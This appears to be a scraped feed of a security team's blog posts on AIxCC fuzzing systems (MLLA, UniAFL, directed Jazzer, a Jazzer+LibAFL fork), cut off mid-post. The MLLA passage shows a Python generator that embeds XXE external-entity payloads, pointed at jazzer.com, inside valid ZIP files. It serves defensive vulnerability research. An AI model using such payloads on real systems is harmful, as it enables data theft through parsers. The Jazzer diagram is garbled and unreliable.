Fresh code. Complex format. Multiple validation layers. In other words, exactly the kind of target where traditional fuzzing struggles.\nThe Challenge This particular vulnerability required understanding Apache Tika\u0026rsquo;s new 3DXML processing pipeline:\nMulti-layer validation: ZIP structure must be valid before XML parsing begins Format complexity: ZIP files need proper headers, central directories, CRC32 checksums Manifest structure: The ZIP must contain a valid Manifest.xml pointing to a .3dxml root file XML parsing chain: The root file gets parsed by a SAX parser, creating XXE opportunities Vulnerability detection: The exploit must trigger an external entity access that Jazzer\u0026rsquo;s sanitizers can detect Here\u0026rsquo;s the kind of generator MLLA produces:\ndef generate(rnd: random.Random) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Generate XXE payloads embedded in valid ZIP files. This demonstrates MLLA\u0026#39;s approach: not just generating XML, but orchestrating complex multi-format attacks. \u0026#34;\u0026#34;\u0026#34; # Step 1: Choose attack strategy intelligently strategy = rnd.choice([\u0026#39;basic_xxe\u0026#39;, \u0026#39;xinclude\u0026#39;, \u0026#39;schema_ref\u0026#39;, \u0026#39;dtd_external\u0026#39;]) # Step 2: Create valid ZIP container structure root_filename = rnd.choice([\u0026#39;root.xml\u0026#39;, \u0026#39;data.xml\u0026#39;, \u0026#39;content.xml\u0026#39;]) manifest = create_manifest(root_filename) # Step 3: Generate XXE payload based on strategy if strategy == \u0026#39;basic_xxe\u0026#39;: xml_content = create_xxe_entity(rnd) elif strategy == \u0026#39;xinclude\u0026#39;: xml_content = create_xinclude_attack(rnd) # ... other strategies # Step 4: Build complete ZIP file with proper binary structure return create_zip([(\u0026#39;Manifest.xml\u0026#39;, manifest), (root_filename, xml_content)], rnd) def create_xxe_entity(rnd): \u0026#34;\u0026#34;\u0026#34;Generate XXE with external entity targeting jazzer.com\u0026#34;\u0026#34;\u0026#34; port = rnd.choice([80, 443, 8080, 8443]) path = rnd.choice([\u0026#39;\u0026#39;, \u0026#39;/test\u0026#39;, \u0026#39;/data.xml\u0026#39;, \u0026#39;/api/endpoint\u0026#39;]) return f\u0026#39;\u0026#39;\u0026#39;\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE root [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;http://jazzer.com:{port}{path}\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;root\u0026gt;\u0026amp;xxe;\u0026lt;/root\u0026gt;\u0026#39;\u0026#39;\u0026#39;.encode(\u0026#39;utf-8\u0026#39;) def create_zip(files, rnd): \u0026#34;\u0026#34;\u0026#34;Construct valid ZIP with proper headers, compression, CRC32...\u0026#34;\u0026#34;\u0026#34; # This is where the binary format mastery happens zip_data = bytearray() for filename, content in files: # Choose compression strategy compress_level = rnd.choice([0, 1, 6, 9]) compressed = zlib.compress(content, compress_level) if compress_level else content # Build ZIP headers with proper signatures and metadata header = struct.pack(\u0026#39;\u0026lt;I\u0026#39;, 0x04034b50) # ZIP local file header header += struct.pack(\u0026#39;\u0026lt;H\u0026#39;, 20) # Version needed header += struct.pack(\u0026#39;\u0026lt;H\u0026#39;, 0) # Flags header += struct.pack(\u0026#39;\u0026lt;H\u0026#39;, 8 if compress_level else 0) # Compression method header += struct.pack(\u0026#39;\u0026lt;I\u0026#39;, zlib.crc32(content) \u0026amp; 0xffffffff) # CRC32 # ... complete ZIP specification implementation zip_data.extend(header + filename.encode() + compressed) # Add central directory and end-of-central-directory records zip_data.extend(build_central_directory(files)) return bytes(zip_data) What Makes This Different? Look at what this generator accomplishes in a single function: it\u0026rsquo;s not just creating random XML files or mutating ZIP bytes. It\u0026rsquo;s orchestrating a complete multi-format attack that traditional fuzzing would struggle to achieve.\nFirst, there\u0026rsquo;s the format juggling act. The generator has to be fluent in both ZIP and XML simultaneously. It creates valid ZIP headers with proper CRC32 checksums and compression while embedding perfectly formed XML with complex XXE syntax. Try explaining to a random mutator how to maintain both ZIP structural integrity AND XML semantic correctness while crafting an exploit ‚Äì it\u0026rsquo;s like asking someone to play chess and poker at the same time.\nSecond, it\u0026rsquo;s thinking strategically, not randomly. Notice how it chooses attack vectors (basic_xxe, xinclude, schema_ref) and varies parameters intelligently ‚Äì common ports like 443 for higher success probability, but also uncommon ones like 8443 to explore edge cases. It\u0026rsquo;s not uniform randomness; it\u0026rsquo;s informed exploration based on what a security researcher would try.\nThe real breakthrough is that MLLA generates attack strategies, not just attack payloads. Each generator function is essentially a condensed security researcher\u0026rsquo;s playbook, encoded in executable Python that can run thousands of variations.\nTraditional fuzzing would need millions of random mutations to stumble upon:\nA valid ZIP file structure With properly embedded XML That contains working XXE syntax Targeting the exact domain that triggers detection MLLA does all of this systematically in a single generator that adapts its approach based on what it learns about the target. This strategic approach proved itself in competition ‚Äì contributing 7 unique vulnerabilities that required exactly this kind of format-aware, intelligent exploration to discover.\nThe Tactical Advantage: Two-Mode Operation But MLLA isn\u0026rsquo;t just one monolithic system. It\u0026rsquo;s designed with tactical flexibility ‚Äì operating in two complementary modes depending on the situation:\nüöÄ Standalone Mode: Fast and Broad When you need to quickly explore a new codebase, MLLA\u0026rsquo;s standalone mode kicks into action. It:\nAnalyzes only the harness file (no deep call graph analysis) Generates diverse seeds using the same script-based approach Operates with minimal setup and resource requirements Provides rapid coverage of the vulnerability search space Think of it as MLLA\u0026rsquo;s reconnaissance mode ‚Äì quickly surveying the terrain and generating interesting inputs to get fuzzing started.\nüî¨ Full Pipeline Mode: Deep and Targeted When standalone mode or other fuzzing modules discover interesting crash sites or code paths, the full MLLA pipeline engages:\nAll five agents (CGPA, CPUA, MCGA, BCDA, BGA) work in concert Builds comprehensive call graphs and identifies precise vulnerability paths Generates highly targeted exploits for specific bug candidates Employs sophisticated static analysis and LLM reasoning This is MLLA\u0026rsquo;s surgical mode ‚Äì taking interesting leads and turning them into concrete, exploitable vulnerabilities.\nüéØ The Power of Adaptability This dual-mode design captures a crucial insight: the best AI-assisted security tools aren\u0026rsquo;t about replacing human approaches, but about intelligently amplifying them at exactly the right moments.\nSometimes you need broad exploration (standalone mode). Sometimes you need surgical precision (full pipeline). MLLA supports both modes, allowing users to choose the approach that best fits their current needs.\nThe Orchestration: When All Agents Unite Here\u0026rsquo;s how the magic actually happens when the full pipeline mode is activated. Picture a cybersecurity war room where our five AI agents collaborate:\nCPUA surveys the target, identifying the most promising entry points. MCGA maps out how these entry points connect to potentially dangerous code, while CGPA ensures everyone stays oriented in the complexity. BCDA analyzes these connections to confirm genuine vulnerabilities, and BGA then crafts targeted exploits for the identified issues.\nIn this orchestrated process, agents work in coordination, sharing information and building upon each other\u0026rsquo;s findings to systematically identify and exploit vulnerabilities.\nThe Results: 7 Vulnerabilities That Mattered When the competition ended, we couldn\u0026rsquo;t measure MLLA\u0026rsquo;s exact contribution. We\u0026rsquo;d intentionally turned off logging early on to save storage and computing costs, which meant we couldn\u0026rsquo;t get the exact final evaluation results for each module. However, by utilizing the OpenTelemetry logs from the organizers, we confirmed that MLLA contributed to finding at least 7 unique vulnerabilities.\nThese weren\u0026rsquo;t random crashes. They were sophisticated bugs hiding behind validation layers, buried in complex file format parsers, and dependent on precise semantic relationships between code components. Exactly the kind of strategic, format-aware vulnerabilities that traditional fuzzing struggles to find.\nBut here\u0026rsquo;s what really matters: in our extensive internal testing before submission, MLLA consistently demonstrated value beyond just finding bugs. It often reached complex vulnerabilities that no other module could touch. And even when MLLA didn\u0026rsquo;t directly trigger the final crash (that honor went to its BGA component), its intermediate outputs like bug hypotheses, branch conditions, and semantic traces significantly enriched UniAFL\u0026rsquo;s seed pool and results. MLLA acted not just as a bug finder, but as a catalyst that amplified the effectiveness of the entire system.\nThe Engineering Reality Check Building MLLA wasn\u0026rsquo;t just about having a cool idea ‚Äì it meant solving some genuinely hard engineering problems:\nCost Control: Five AI agents making thousands of LLM calls can bankrupt you fast. We had to get creative with prompt optimization and aggressive caching.\nSpeed vs. Intelligence: LLMs are slow compared to traditional fuzzing. Our solution? Massive parallelization and asynchronous execution so agents can work simultaneously.\nFighting Hallucinations: More LLM usage means more opportunities for AI to confidently tell you complete nonsense. We built validation layers and cross-checking systems to keep agents honest.\nContext Juggling: Complex vulnerabilities need lots of context, but LLMs have limits. We developed compression techniques to fit elephant-sized problems into mouse-sized context windows.\nWhat\u0026rsquo;s Coming Next MLLA proves that AI-assisted vulnerability discovery isn\u0026rsquo;t science fiction ‚Äì it\u0026rsquo;s here, it works, and it finds bugs that traditional approaches miss. But this is just the beginning.\nWe\u0026rsquo;re already envisioning the next generation: agents that learn from every vulnerability they find, AI systems that collaborate with human researchers in real-time, and tools that don\u0026rsquo;t just find bugs but automatically generate patches. The future of cybersecurity isn\u0026rsquo;t just about being faster ‚Äì it\u0026rsquo;s about being fundamentally smarter.\nDive Deeper This overview just scratches the surface. In our upcoming deep-dive posts, we\u0026rsquo;ll pull back the curtain on each component:\nüó∫Ô∏è Code Understanding \u0026 Navigation: How CPUA, MCGA, and CGPA work together to map and analyze massive codebases üî¨ The Detective Work: BCDA's techniques for distinguishing real vulnerabilities from false positives üõ†Ô∏è The Exploit Factory: BGA's three-agent framework (BlobGen, Generator, Mutator) and why script-based generation outperforms direct payload creation üß† Context Engineering: How MLLA prompts LLMs effectively and manages context windows for vulnerability discovery Ready to explore?\nüåê Browse the complete MLLA source code üìñ Learn about UniAFL, MLLA\u0026rsquo;s parent system üõ†Ô∏è Deep dive into BGA\u0026rsquo;s self-evolving exploits üß† Context Engineering: How BGA teaches LLMs to write exploits üó∫Ô∏è Deep dive into CPUA, MCGA, CGPA\u0026rsquo;s code understanding and navigation üî¨ Coming Soon: BCDA - The AI Detective Separating Real Bugs from False Alarms The age of intelligent vulnerability discovery has arrived. MLLA proves that when you combine human-level strategic thinking with machine-scale execution, you don\u0026rsquo;t just find more bugs ‚Äì you find the right bugs. The ones that matter. The ones that traditional approaches miss.\n"},{"section":"Blog","slug":"/blog/post-crs-multilang/","title":"Atlantis-Multilang (UniAFL): LLM-powered &amp; Lauguage-agonistic Automatic Bug Finding","description":"Overview of Atlantis-Multilang","date":"August 20, 2025","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/crs-multilang/multilang_hu_f2c6fddb51a010ff.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"280\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/crs-multilang\\/multilang_hu_bce4084b6cb4879a.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/crs-multilang/multilang_hu_ad57e85fee90751b.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/crs-multilang\\/multilang_hu_4703b05081cafef9.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Atlantis-Multilang","tags":"multilang","content":"Atlantis-Multilang == UniAFL Atlantis-Multilang is a fuzzing framework called UniAFL, designed to LLMs for fuzzing across multiple programming languages. Unlike Atlantis-C and Atlantis-Java, it avoids language-specific instrumentation and is intentionally built to be as language-agnostic as possible ‚Äî both in design and execution. Despite this broad and general approach, UniAFL proved to be highly effective in the AIxCC finals, contributing to 69.2% of all POV (Proof-of-Vulnerability) submissions. This result highlights not only the flexibility of its design but also its strong performance in practice. In this post, we‚Äôll walk you through how we pulled it off, why we made these design choices, and what made UniAFL so effective in practice.\nDesign of UniAFL üéØ Language-Agnostic Fuzzing Challenge Programs in AIxCC were provided in the OSS-Fuzz project format, which supports a variety of programming languages such as C, C++, and Java. Traditional fuzzers, however, often lock themselves into specific languages‚Äîor even specific compiler versions‚Äîmaking them less flexible. With UniAFL, we set out to support fuzzing across any OSS-Fuzz‚Äìcompatible language. While the competition only included C and Java, our design is extensible to Python, Rust, Go, and beyond. No matter the language, the fuzzer should be able to plug in and run. ü§ñ Boosting Fuzzing Performance with LLMs A long-standing bottleneck in fuzzing is how effectively inputs are generated and mutated. Existing approaches often improve incrementally, but they struggle with complex targets that demand highly structured inputs. UniAFL leverages LLMs to enhance this process. Instead of relying solely on random mutations, LLMs can infer and generate semantically valid, yet edge-case-driven inputs. This dramatically increases the chances of triggering vulnerabilities. Due to restrictions on LLM usage during AIxCC, we designed UniAFL in a modular way, allowing for multiple levels of LLM involvement‚Äîranging from minimal use to full integration, depending on available resources and rules. Not only for the competition, but also in real-world use, this allows us to pick certain LLM-powered modules depending on the LLM budget. ‚ö° Optimizing the Fuzzing Pipeline and Development Workflow Fuzzing shines when run in parallel across many cores, but this also introduces synchronization overhead between fuzzing processes. UniAFL includes optimizations to minimize cross-process overhead, ensuring smooth performance at scale. In addition, supporting multi-language CPs demanded a flexible architecture. We modularized UniAFL so that language-specific components can be added, swapped, or updated with minimal friction. This not only accelerates development but also makes the system easier to maintain and extend. Overview of UniAFL As shown in the above overview figure, ATLANTIS-Multilang consists of two main components: UniAFL and FuzzDB. UniAFL is the engine that drives fuzzing according to the three design goals we described earlier, while FuzzDB acts as the storage layer, keeping track of everything UniAFL produces \u0026ndash; seeds, POVs, coverage data, and bug candidates. Notably, In the figure, the green boxes represent the LLM-powered modules, highlighting the parts of the system where LLM plays a role in enhancing fuzzing effectiveness.\nAt a high level, UniAFL works much like a traditional fuzzer, but with some unique twists:\nCorpus Manager picks a seed input to start fuzzing, especially directed fuzzing toward bug candidates, which are intermediate results of LLM-powered modules in UniAFL. Input Generators then create new inputs either by mutating the seed or generating fresh inputs from scratch. Some of these input generators go a step further: instead of directly producing inputs, they generate Python scripts that generate or mutate inputs, giving us more flexibility in creating structured test cases. Script Executor runs those Python scripts, turning them into actual inputs. Input Executor feeds those inputs into the target harness and collects execution results along with coverage data. Coverage Symbolizer converts raw edge coverage into line coverage ‚Äî a crucial step, since the LLM-powered modules rely on line-level feedback because LLM cannot understand basic block addresses in raw coverage data. Finally, based on execution results and coverage data, Corpus Manager updates the corpus and schedulers to guide directed fuzzing. This procedure repeats continuously until the fuzzing session ends to explore deeper paths and uncover vulnerabilities.\nInside UniAFL: Six Input Generation Modules At the heart of UniAFL are its six input generation modules, each designed with a different level of reliance on LLMs. This modular design lets the system balance between traditional fuzzing techniques and AI-powered enhancements.\nNo LLMs Given Fuzzer: the simplest module, running the target harness directly using libFuzzer (for C) and Jazzer (for Java) Hybrid Fuzzer: combines fuzzing with concolic execution to explore deeper paths. While the core workflow does not use LLMs, we employed LLMs during development to assist in symbolic function modeling for the concolic executor. Limited LLM Usage Dictionary-Based: uses an LLM to infer dictionaries for a given function, then applies dictionary-based mutations at the function level. TestLang-Based: asks the LLM to analyze the target‚Äôs input format, express it in TestLang (a specialized input description language), and then generate or mutate inputs accordingly. MLLA-Standalone: employs an LLM to write Python scripts that, in turn, generate new inputs. Full LLM Power MLLA: the most LLM-intensive module. It leverages AI to construct tainted call graphs, identify promising bug candidates, and generate targeted inputs or Python scripts that produce mutations specifically aimed at those candidates. By combining these six modules, UniAFL can flexibly scale its fuzzing strategy from lightweight, language-agnostic fuzzing to deeply AI-driven, bug-targeted exploration. Here are the overall results showing how each input generator contributed in the AIxCC finals and our internal rounds:\n+--------------------+--------------------------+------------------------------------+ | Input Generator | Unique POV (AIxCC Final) | Seed Contribution (Internal Round) | +--------------------+--------------------------+------------------------------------+ | Given Fuzzer | 48 | 69.9% | | Hybrid Fuzzer | 2 | 0.2% | | Dictionary-based | 0 | 4.8% | | Testlang-based | 8 | 42.7% (Separate Seed Pool) | | MLLA (+Standalone) | 7 | 2.2% | | Given Seeds, etc | 9 | 22.9% | +--------------------+--------------------------+------------------------------------+ Looking at the overall results from both the AIxCC finals and our internal rounds, we observed how each input generator contributed. The Given Fuzzer served as the baseline, but on its own it struggled to discover more interesting seeds or POVs. The real breakthroughs came when the other input generators kicked in. They consistently provided meaningful new inputs that helped UniAFL break out of plateaus whenever the given fuzzer got stuck. What\u0026rsquo;s Next? üöÄ See upcoming individual posts diving deeper into each input generator and the UniAFL infrastructure! üåê Check UniAFL Source Code! üß† Explore MLLA: The Multi-Language LLM Agent System "},{"section":"Blog","slug":"/blog/post-crs-java-directed-jazzer/","title":"Sinkpoint-focused Directed Fuzzing","description":"Guiding Jazzer towards critical code locations","date":"August 19, 2025","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/crs-java/directed/featured_hu_f390902fbc214e99.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"280\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/crs-java\\/directed\\/featured_hu_7841ad9fd258e39a.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/crs-java/directed/featured_hu_f41b42b3f47c88c8.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/crs-java\\/directed\\/featured_hu_dc5659ed1fc9f825.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Atlantis-Java","tags":"directed fuzzing, java, sinkpoints","content":"Traditional coverage-based fuzzers excel at code exploration. When testing Java code, however, most vulnerabilities require the invocation of a certain Java API, such as creating an SQL statement (java.sql.Statement) for an SQL injection bug. Thus, we target such security-critical APIs with our modified, directed Jazzer to reach and exploit critical code locations faster. This blog post gives an overview over our directed fuzzing setup for Java challenge problems.\nCalculating a distance metric for directed fuzzing requires static analysis to identify critical code locations (aka sinkpoints) and compute distances. This static analysis happens mostly offline, independent of the modified Jazzer, to reduce the computational overhead in the fuzzer. However, we still compute the CFG (and, thus, basic block-level distances) in Jazzer to maintain a precise distance metric and allow the update of seed distances during fuzzing.\nFigure 1: Overview of sinkpoint-focused directed fuzzing architecture.\nSplitting up the calculation of the iCFG is also observable in the overview of our directed fuzzing architecture (Figure 1). In an ideal world, we would perform the entire static analysis outside of Jazzer to improve fuzzing performance; particularly, we need to keep the startup overhead low since Jazzer may restart frequently on certain targets, for example, if they consume large amounts of memory. However, calculating precise basic block-level distances ahead of time proves challenging under the given competition constraints.\nBasic block-level distances. There mainly exist two approaches to pre-compute basic block-level distances: 1) Assigning distances to coverage IDs and 2) assigning distances to basic blocks/instructions.\nCoverage ID Assignment: Jazzer assigns coverage IDs dynamically during class loading, making them non-deterministic. The assignment order depends on when classes get loaded during execution, which varies based on fuzzing inputs and execution paths. While Jazzer can pre-assign IDs by rewriting JAR files, we avoid this approach for competition stability reasons.\nBytecode Instruction Matching: Even if we pre-compute the CFG, matching pre-computed distances to post-instrumentation basic blocks proves challenging. Jazzer\u0026rsquo;s instrumentation modifies bytecode in ways that affect instruction offsets:\nThe runtime constant pool grows larger due to added coverage instrumentation Original instructions change from ldc to ldc_w or ldc2_w when constant pool indices exceed 8-bit limits These changes cascade through the bytecode, shifting offsets of subsequent instructions Basic block boundaries can shift unpredictably due to these instruction size changes While heuristic matching approaches exist (e.g., matching by instruction patterns or control flow signatures), the competition environment demands high reliability. False or missing matches could misdirect the fuzzer toward incorrect targets, potentially worse than no guidance at all.\nDesign Decision: Given these constraints, we split the interprocedural CFG computation: call graph analysis happens offline during static analysis, while control flow graph construction occurs online within Jazzer. This design trades some performance for precision and reliability, ensuring accurate distance calculations even as bytecode gets modified during instrumentation.\nStatic Analysis Our static analysis pipeline detects sinkpoints, checks reachability and exploitability, and calculates sinkpoint distances in the call graph. Recognizing that no single analysis tool provides complete call graph coverage, we merge the call graphs from multiple frameworks including CodeQL, Soot, and Joern as well as from dynamic execution traces. This multi-tool approach handles Java\u0026rsquo;s complex object-oriented features where interface calls and reflective invocations often confound individual analyzers.\nSinkpoint Detection. While Jazzer has a list of sinkpoint APIs which it sanitizes, we identified additional APIs that are likely to trigger vulnerabilities. Our CodeQL component establishes a framework for specifying security-sensitive APIs that extend beyond Jazzer\u0026rsquo;s built-in sanitizers. Rather than exhaustively analyzing every library dependency, our approach extends the sink API list while focusing analysis only on challenge problem code instead of all dependencies.\n# Example sink definition for java.net.URL - model: # URL(String spec) package: \u0026#34;java.net\u0026#34; type: \u0026#34;URL\u0026#34; subtypes: false name: \u0026#34;URL\u0026#34; signature: \u0026#34;(String)\u0026#34; ext: \u0026#34;\u0026#34; input: \u0026#34;Argument[0]\u0026#34; kind: \u0026#34;sink-ServerSideRequestForgery\u0026#34; provenance: \u0026#34;manual\u0026#34; metadata: description: \u0026#34;SSRF by URL\u0026#34; We added sinkpoints for additional vulnerability classes including java.math.BigDecimal (DoS), networking APIs (SSRF), validation frameworks (expression injection), and XML/SVG parsers. This approach reduces analysis time from hours to minutes by focusing only on challenge problem code rather than exhaustively analyzing all dependencies, leaving maximum time for directed fuzzing.\nReachability Analysis. We perform per-harness reachability analysis to ensure that sinkpoints are only scheduled in the directed fuzzer, if they are accessible from the harness entry point, eliminating unreachable targets that would deflect the fuzzer\u0026rsquo;s attention.\nExploitability Analysis. Beyond identification, we assess whether sinkpoints are practically exploitable by analyzing data flow patterns. When we find strong evidence that a sinkpoint is not exploitable (hardcoded arguments, untainted inputs), we filter it out. This transforms large lists of potential targets (hundreds to thousands) into manageable sets of high-value sinkpoints (typically under 100).\nMethod-Level Distance Computation. The static analysis phase pre-computes method-level distances from harness entry points to all reachable sinkpoints using the merged call graph. These cached distances are combined with the runtime basic block-level calculations, to determine the distance of a given fuzzing input.\nDirected Jazzer Our enhanced Jazzer transforms static analysis insights into dynamic fuzzing guidance through two main components:\nDistance Metric Calculation. During fuzzing execution, we compute basic block-level distances in real-time using Soot\u0026rsquo;s control flow graph analysis. The system combines pre-computed method-level distances with runtime basic block distances to guide input mutation toward sinkpoints. The distance metric itself uses an off-the-shelf formula: We calculate the average distance of each basic block given the trace of a seed, with the basic block distance being the sum of the method distance and the intra-CFG distance to the next level in the CG.\nSinkpoint Scheduling. Our scheduler schedules up to 15 concurrent sinkpoints using prioritized round-robin scheduling. The system uses two separate queues to implement prioritization: one queue contains all active sinkpoints, while a second queue contains only high-priority sinkpoints from SARIF reports or diff mode. The round-robin scheduler consideres both queues, effectively scheduling SARIF and diff-related sinkpoints twice as frequently as regular sinkpoints. This dual-queue approach ensures that competition-relevant sinkpoints receive appropriate focus while maintaining systematic coverage and a scheduling guarantee for all sinkpoints.\nEvaluation We evaluated our directed fuzzing approach on our own benchmark suite. As expected, directed fuzzing improves performance on benchmarks with certain characteristics, where sinkpoints are difficult to reach, such as ActiveMQVar. For targets where traditional fuzzing immediately reaches sinkpoints, directed fuzzing provides no additional benefit. ActiveMQVar represents a challenging case with a wide call graph and multiple code paths, making it difficult for coverage-based fuzzing to efficiently reach all specific sinkpoints.\nFigure 2: Directed fuzzing evaluation result on our ActiveMQVar benchmark.\nResults: Our directed approach achieved faster sinkpoint discovery compared to standard Jazzer after initial setup time (Figure 2). Within the 4-hour evaluation timeframe typical of the competition scenario, directed fuzzing successfully identified all 12 ground-truth vulnerabilities. The system detected additional sinkpoints beyond the 12 true positives; however, the small number of false positives did not significantly impact overall performance.\nOur investigation on the benchmark suite found that directed fuzzing provides substantial benefits in scenarios with wide call graphs where traditional approaches struggle to make progress toward specific targets. The initial overhead of static analysis and setup is quickly amortized by more efficient sinkpoint reaching, leading to faster overall vulnerability discovery.\nConclusion With our directed fuzzing framework, we ensure that the fuzzer reaches critical code locations faster than traditional approaches. By combining static analysis with runtime distance computation, we create a system that efficiently navigates toward sinkpoints while avoiding the computational overhead of full dynamic analysis. The approach proves particularly valuable in the time-constrained competition scenario where reaching security-critical code quickly is essential for effective vulnerability discovery.\nThis precision-guided approach represents a significant evolution beyond coverage-based fuzzing, focusing computational resources on the code locations that matter most for security testing.\nReferences Directed Jazzer modifications Static analysis components based on CodeQL and Soot This post is part of our series on Atlantis-Java components. We already explored our LibAFL-based Jazzer integration for enhanced mutation diversity. Check back later for more.\n"},{"section":"Blog","slug":"/blog/post-crs-java-libafl-jazzer/","title":"Jazzer+LibAFL: Insights into Java Fuzzing","description":"How we incorporated LibAFL as a new fuzzing backend for Jazzer","date":"August 19, 2025","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/crs-java/libafl-jazzer/jazzer_plus_libafl_hu_23bb1651f2271206.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"267\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/crs-java\\/libafl-jazzer\\/jazzer_plus_libafl_hu_f8cf71fdf029df74.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/crs-java/libafl-jazzer/jazzer_plus_libafl_hu_a074aa50a3d82dc4.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/crs-java\\/libafl-jazzer\\/jazzer_plus_libafl_hu_d1bcde7796ef686e.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Atlantis-Java","tags":"retrospective, java","content":"AIxCC involved finding bugs in software written in two languages: C++ and Java. The focus of the competition was on the use of LLMs and AI, however, our teams approach was to balance ambitious strategies alongside proven traditional bug-finding techniques like fuzzing. While our team was deeply familiar with fuzzing C++ from decades of academic research and industry work, Java was uncharted territory for us. In part of our Java fuzzing development we created a fork of Jazzer that uses LibAFL as the fuzzing backend and it is available as part of our open source release. This post details some of the lessons we learned about Java fuzzing and the creation of this fork.\nDARPA chose Jazzer as their baseline fuzzer and sanitizer framework for Java challenges.\nJazzer Jazzer is an open-source Java Fuzzer developed by the Code Intelligence company. It makes use of LibFuzzer (written in C++) using the Java Native Interface (JNI). The architecture of Jazzer is roughly:\nr J J u T P a a n a r v z O r o a z n g g e e e r r ( t a ) m J J N N S I I a n C o v 1 2 f . . u U z p L z d L * _ a V f t t t M u a e e L F z r s i u z g t L b z i e O i C F z n t n b + u e g _ e F + z r r I u z R l u n z e u o n p z r n o n u e D p e t r r * r i . f v c e e p e r p d b a c k Jazzer begins by using the JNI to make a call to LLVMFuzzerRunDriver which is LibFuzzer\u0026rsquo;s recommended way of using it as a library. This starts the C++ fuzzing loop inside libFuzzer where Jazzer\u0026rsquo;s stub fuzz driver fuzz_target_runner.cpp implements a testOneInput method. This method is very simple and uses the JNI to call to a private static int runOne(long dataPtr, int dataLength) in Java.\nFrom here, Jazzer takes the void* input from LibFuzzer and converts it into the appropriate type before handing it off to the Java fuzzing entrypoint such as fuzzerTestOneInput(byte[] input).\nOn the Java side of things, Jazzer makes use of the JaCoCo code coverage library and ASM to inject instrumentation hooks into the program\u0026rsquo;s edges. These coverage tracking hooks insert a call to the recordCoverage(int id) method in CoverageMap.java. Jazzer here uses the UNSAFE.putByte function from sun.misc.Unsafe to directly write the edge into the coverage map memory location. LibFuzzer makes use of the LLVM Sanitizer Coverage (SanCov) API to receive coverage feedback. Jazzer hooks into this system by using the __sanitizer_cov_pcs_init method to set where in memory the coverage map is being stored.\nWhen control flow returns from the Java fuzzerTestOneInput program and flows back to the fuzzing loop inside LibFuzzer, it can now mutate the input and we can successfully fuzz a Java program.\nNote: This explanation glosses over details such as how Jazzer also instruments comparison functions and provides them to LibFuzzer for value-feedback based mutation.\nThe State of Jazzer and LibFuzzer Unfortunately, right as the AIxCC competition started, Code Intelligence announced that they had stopped maintaining Jazzer as an open-source project in favor of their commercial offerings. That change has since been 